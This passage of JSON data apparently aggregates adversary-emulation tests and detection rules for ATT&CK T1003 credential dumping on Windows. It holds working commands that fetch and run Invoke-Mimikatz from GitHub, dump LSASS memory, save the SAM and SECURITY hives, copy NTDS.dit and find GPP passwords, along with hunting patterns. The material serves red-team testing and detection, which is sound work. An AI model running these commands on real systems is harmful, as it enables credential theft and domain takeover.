failures include seeing an \"access denied\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n", "supported_platforms": ["windows"], "input_arguments": {"remote_script": {"description": "URL to a remote Mimikatz script that dumps credentials", "type": "Url", "default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\n"}}, {"name": "Gsecdump", "description": "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's following by two 32 characters hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n", "supported_platforms": ["windows"], "input_arguments": {"gsecdump_exe": {"description": "Path to the Gsecdump executable", "type": "Path", "default": "PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe"}, "gsecdump_url": {"description": "Path to download Gsecdump binary file", "type": "url", "default": "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe"}, "gsecdump_bin_hash": {"description": "File hash of the Gsecdump binary file", "type": "String", "default": "94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Gsecdump must exist on disk at specified location (#{gsecdump_exe})\n", "prereq_command": "if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}\n", "get_prereq_command": "$parentpath = Split-Path \"#{gsecdump_exe}\"; $binpath = \"$parentpath\\gsecdump-v2b5.exe\"\nIEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1\")\nif(Invoke-WebRequestVerifyHash \"#{gsecdump_url}\" \"$binpath\" #{gsecdump_bin_hash}){\n  Move-Item $binpath \"#{gsecdump_exe}\"\n}\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "#{gsecdump_exe} -a\n"}}, {"name": "Windows Credential Editor", "description": "Dump user credentials using Windows Credential Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)\n\nUpon successful execution, you should see a file with user passwords/hashes at %temp%/wce-output.file.\n\nIf you see no output it is likely that execution was blocked by Anti-Virus. \n\nIf you see a message saying \"wce.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install Windows Credential Editor first.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Path where resulting data should be placed", "type": "Path", "default": "%temp%\\wce-output.txt"}, "wce_exe": {"description": "Path of Windows Credential Editor executable", "type": "Path", "default": "PathToAtomicsFolder\\T1003\\bin\\wce.exe"}, "wce_url": {"description": "Path to download Windows Credential Editor zip file", "type": "url", "default": "https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip"}, "wce_zip_hash": {"description": "File hash of the Windows Credential Editor zip file", "type": "String", "default": "8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Windows Credential Editor must exist on disk at specified location (#{wce_exe})\n", "prereq_command": "if (Test-Path #{wce_exe}) {exit 0} else {exit 1}\n", "get_prereq_command": "$parentpath = Split-Path \"#{wce_exe}\"; $zippath = \"$parentpath\\wce.zip\"\nIEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1\")\nif(Invoke-WebRequestVerifyHash \"#{wce_url}\" \"$zippath\" #{wce_zip_hash}){\n  Expand-Archive $zippath $parentpath\\wce -Force\n  Move-Item $parentpath\\wce\\wce.exe \"#{wce_exe}\"\n  Remove-Item $zippath, $parentpath\\wce -Recurse\n}\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "#{wce_exe} -o #{output_file}\n", "cleanup_command": "del \"#{output_file}\" >nul 2>&1"}}, {"name": "Registry dump of SAM, creds, and secrets", "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n", "cleanup_command": "del %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul\n"}}, {"name": "Dump LSASS.exe Memory using ProcDump", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Path where resulting dump should be placed", "type": "Path", "default": "C:\\Windows\\Temp\\lsass_dump.dmp"}, "procdump_exe": {"description": "Path of Procdump executable", "type": "Path", "default": "PathToAtomicsFolder\\T1003\\bin\\procdump.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n", "prereq_command": "if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"$env:TEMP\\Procdump.zip\"\nExpand-Archive $env:TEMP\\Procdump.zip $env:TEMP\\Procdump -Force\nNew-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null\nCopy-Item $env:TEMP\\Procdump\\Procdump.exe #{procdump_exe} -Force\n"}], "executor": {"elevation_required": true, "name": "command_prompt", "command": "#{procdump_exe} -accepteula -ma lsass.exe #{output_file}\n", "cleanup_command": "del \"#{output_file}\" >nul 2> nul\n"}}, {"name": "Dump LSASS.exe Memory using comsvcs.dll", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n", "supported_platforms": ["windows"], "executor": {"elevation_required": true, "name": "powershell", "command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n", "cleanup_command": "Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore\n"}}, {"name": "Dump LSASS.exe Memory using direct system calls and API unhooking", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\windows\\temp\\dumpert.dmp.\n\nIf you see a message saying \"The system cannot find the path specified.\", try using the  get-prereq_commands to download the  tool first.\n", "supported_platforms": ["windows"], "input_arguments": {"dumpert_exe": {"description": "Path of Dumpert executable", "type": "Path", "default": "PathToAtomicsFolder\\T1003\\bin\\Outflank-Dumpert.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Dumpert executable must exist on disk at specified location (#{dumpert_exe})\n", "prereq_command": "if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null\nInvoke-WebRequest \"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\" -OutFile #{dumpert_exe}\n"}], "executor": {"elevation_required": true, "name": "command_prompt", "command": "#{dumpert_exe}\n", "cleanup_command": "del C:\\windows\\temp\\dumpert.dmp >nul 2> nul\n"}}, {"name": "Dump LSASS.exe Memory using Windows Task Manager", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task\nManager and administrative permissions.\n", "supported_platforms": ["windows"], "executor": {"name": "manual", "steps": "1. Open Task Manager:\n  On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking\n  on the task bar and selecting \"Task Manager\".\n\n2. Select lsass.exe:\n  If lsass.exe is not visible, select \"Show processes from all users\". This will allow you to observe execution of lsass.exe\n  and select it for manipulation.\n\n3. Dump lsass.exe memory:\n  Right-click on lsass.exe in Task Manager. Select \"Create Dump File\". The following dialog will show you the path to the saved file.\n"}}, {"name": "Offline Credential Theft With Mimikatz", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n", "supported_platforms": ["windows"], "input_arguments": {"mimikatz_exe": {"description": "Path of the Mimikatz binary", "type": "string", "default": "PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe"}, "input_file": {"description": "Path of the Lsass dump", "type": "Path", "default": "%tmp%\\lsass.DMP"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n", "prereq_command": "if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip\" -OutFile \"$env:TEMP\\Mimi.zip\"\nExpand-Archive $env:TEMP\\Mimi.zip $env:TEMP\\Mimi -Force\nNew-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null\nCopy-Item $env:TEMP\\Mimi\\x64\\mimikatz.exe #{mimikatz_exe} -Force\n"}, {"description": "Lsass dump must exist at specified location (#{input_file})\n", "prereq_command": "cmd /c \"if not exist #{input_file} (exit /b 1)\"\n", "get_prereq_command": "Write-Host \"Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)\"\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "#{mimikatz_exe} \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n"}}, {"name": "Dump Active Directory Database with NTDSUtil", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n", "supported_platforms": ["windows"], "input_arguments": {"output_folder": {"description": "Path where resulting dump should be placed", "type": "Path", "default": "C:\\Windows\\Temp"}}, "dependencies": [{"description": "Target must be a Domain Controller\n", "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n", "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n"}}, {"name": "Create Volume Shadow Copy with NTDS.dit", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "supported_platforms": ["windows"], "input_arguments": {"drive_letter": {"description": "Drive letter to source VSC (including colon)", "type": "String", "default": "C:"}}, "dependencies": [{"description": "Target must be a Domain Controller\n", "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n", "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "vssadmin.exe create shadow /for=#{drive_letter}\n"}}, {"name": "Copy NTDS.dit from Volume Shadow Copy", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with NTDS.dit\".\nA successful test also requires the export of the SYSTEM Registry hive. \nThis test must be executed on a Windows Domain Controller.\n", "supported_platforms": ["windows"], "input_arguments": {"vsc_name": {"description": "Name of Volume Shadow Copy", "type": "String", "default": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"}, "extract_path": {"description": "Path for extracted NTDS.dit", "type": "Path", "default": "C:\\Windows\\Temp"}}, "dependencies": [{"description": "Target must be a Domain Controller\n", "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n", "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"}, {"description": "Volume shadow copy must exist\n", "prereq_command": "if not exist #{vsc_name} (exit /b 1)\n", "get_prereq_command": "echo Run \"Invoke-AtomicTest T1003 -TestName 'Create Volume Shadow Copy with NTDS.dit'\" to fulfuill this requirement\n"}, {"description": "Extract path must exist\n", "prereq_command": "if not exist #{extract_path} (exit /b 1)\n", "get_prereq_command": "mkdir #{extract_path}\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n", "cleanup_command": "del \"#{extract_path}\\ntds.dit\"        >nul 2> nul\ndel \"#{extract_path}\\VSC_SYSTEM_HIVE\" >nul 2> nul\ndel \"#{extract_path}\\SYSTEM_HIVE\"     >nul 2> nul\n"}}, {"name": "GPP Passwords (findstr)", "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n"}}, {"name": "GPP Passwords (Get-GPPPassword)", "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n", "supported_platforms": ["windows"], "input_arguments": {"gpp_script_path": {"description": "Path to the Get-GPPPassword PowerShell Script", "type": "Path", "default": "PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1"}, "gpp_script_url": {"description": "URL of the Get-GPPPassword PowerShell Script", "type": "url", "default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}\n", "prereq_command": "if(Test-Path \"#{gpp_script_path}\") {exit 0 } else {exit 1 }\n", "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{gpp_script_path}\") -Force | Out-Null\nInvoke-WebRequest #{gpp_script_url} -OutFile \"#{gpp_script_path}\"\n"}, {"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": ". #{gpp_script_path}\nGet-GPPPassword -Verbose\n"}}, {"name": "LSASS read with pypykatz", "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple useranames and passwords/hashes to the screen.\n  \n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must have python 3 installed\n", "prereq_command": "if (python --version) {exit 0} else {exit 1}\n", "get_prereq_command": "echo \"Python 3 must be installed manually\"\n"}, {"description": "Computer must have pip installed\n", "prereq_command": "if (pip3 -V) {exit 0} else {exit 1}\n", "get_prereq_command": "echo \"PIP must be installed manually\"\n"}, {"description": "pypykatz must be installed and part of PATH\n", "prereq_command": "if (cmd /c pypykatz -h) {exit 0} else {exit 1}\n", "get_prereq_command": "pip3 install pypykatz\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "pypykatz live lsa\n"}}, {"name": "Registry parse with pypykatz", "description": "Parses registry hives to obtain stored credentials\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must have python 3 installed\n", "prereq_command": "if (python --version) {exit 0} else {exit 1}\n", "get_prereq_command": "echo \"Python 3 must be installed manually\"\n"}, {"description": "Computer must have pip installed\n", "prereq_command": "if (pip3 -V) {exit 0} else {exit 1}\n", "get_prereq_command": "echo \"PIP must be installed manually\"\n"}, {"description": "pypykatz must be installed and part of PATH\n", "prereq_command": "if (cmd /c pypykatz -h) {exit 0} else {exit 1}\n", "get_prereq_command": "pip3 install pypykatz\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "pypykatz live registry\n"}}]}}, {"Mitre Stockpile - Get a list of all computers in a domain": {"id": "0360ede1-3c28-48d3-a6ef-6e98f562c5af", "name": "GetComputers (Alice)", "description": "Get a list of all computers in a domain", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "Credential Dumping"}, "platforms": {"windows": {"psh": {"command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n", "payloads": ["powerview.ps1"]}}}}}, {"Mitre Stockpile - Dump lsass for later use with mimikatz": {"id": "0ef4cc7b-611c-4237-b20b-db36b6906554", "name": "Leverage Procdump for lsass memory", "description": "Dump lsass for later use with mimikatz", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "Credential Dumping"}, "platforms": {"windows": {"psh": {"command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n"}}}}}, {"Mitre Stockpile - Custom GO credential dumper using minidumpwritedump": {"id": "3c647015-ab0a-496a-8847-6ab173cd2b22", "name": "MiniDumpWriteDump (Spooky)", "description": "Custom GO credential dumper using minidumpwritedump", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "Credential Dumping"}, "platforms": {"windows": {"psh": {"command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n", "payloads": ["totallylegit.exe"]}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.process.id"}]}]}}, {"Mitre Stockpile - Use Invoke-Mimikatz": {"id": "7049e3ec-b822-4fdf-a4ac-18190f9b66d1", "name": "Powerkatz (Staged)", "description": "Use Invoke-Mimikatz", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "Credential Dumping"}, "privilege": "Elevated", "platforms": {"windows": {"psh": {"command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n", "parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}, {"source": "domain.user.name", "edge": "has_hash", "target": "domain.user.ntlm"}, {"source": "domain.user.name", "edge": "has_hash", "target": "domain.user.sha1"}]}, "payloads": ["invoke-mimi.ps1"]}}}}}, {"Mitre Stockpile - Search for possible credentials stored in the HKLM Hive": {"id": "98e58fc4-3843-4511-89b1-50cb872e0c9b", "name": "Credentials in Registry", "description": "Search for possible credentials stored in the HKLM Hive", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "Credential Dumping"}, "platforms": {"windows": {"psh": {"command": "reg query HKLM /f password /t REG_SZ /s\n"}}}}}, {"Mitre Stockpile - Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords": {"id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12", "name": "Run PowerKatz", "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "Credential Dumping"}, "platforms": {"windows": {"psh": {"command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds\n", "parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}}}}}}, {"Threat Hunting Tables": {"chain_id": "100053", "os": "windows", "parent_process": "ntdsutil.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "ntds.dit", "frequency": "rare", "mitre_caption": "credential dumping", "mitre_attack": "T1003", "itw_sample": ""}}, {"SysmonHunter - T1003": {"name": "Credential Dumping", "description": null, "level": "critical", "phase": "Credential Access", "query": [{"type": "reg", "reg": {"path": {"pattern": "HKLM\\SAM|HKLM\\Security"}}, "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\lsass.exe", "flag": "regex", "op": "not"}}, "op": "and"}, {"type": "file", "file": {"path": {"pattern": "\\\\Windows\\\\.+\\\\bcryptprimitives.dll|\\\\Windows\\\\.+\\\\bcrypt.dll|\\\\Windows\\\\.+\\\\ncrypt.dll", "flag": "regex"}}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/ChromeDump", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/collection/ChromeDump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/FoxDump", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/collection/FoxDump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/ninjacopy", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/collection/ninjacopy\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/vaults/add_keepass_config_trigger", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/collection/vaults/add_keepass_config_trigger\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/vaults/find_keepass_config", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/collection/vaults/find_keepass_config\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/vaults/get_keepass_config_trigger", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/collection/vaults/get_keepass_config_trigger\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/vaults/keethief", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/collection/vaults/keethief\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/vaults/remove_keepass_config_trigger", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/collection/vaults/remove_keepass_config_trigger\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/enum_cred_store", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/enum_cred_store\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/cache", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/cache\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/command", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/command\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/dcsync", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/dcsync\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/dcsync_hashdump", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/dcsync_hashdump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/extract_tickets", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/extract_tickets\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/golden_ticket", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "T1097", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/golden_ticket\":  [\"T1003\",\"T1097\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/logonpasswords", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/logonpasswords\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/lsadump", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/lsadump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/mimitokens", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/mimitokens\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/sam", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/sam\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/silver_ticket", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "T1097", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/silver_ticket\":  [\"T1003\",\"T1097\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/trust_keys", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/trust_keys\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/powerdump", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/powerdump\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/vault_credential", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate for Python Dictionary": "\"powershell/credentials/vault_credential\":  [\"T1003\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/downgrade_account", "ATT&CK Technique #1": "T1003", "ATT&CK Technique #2": "", "Technique": "Credential Dumping", "Concatenate 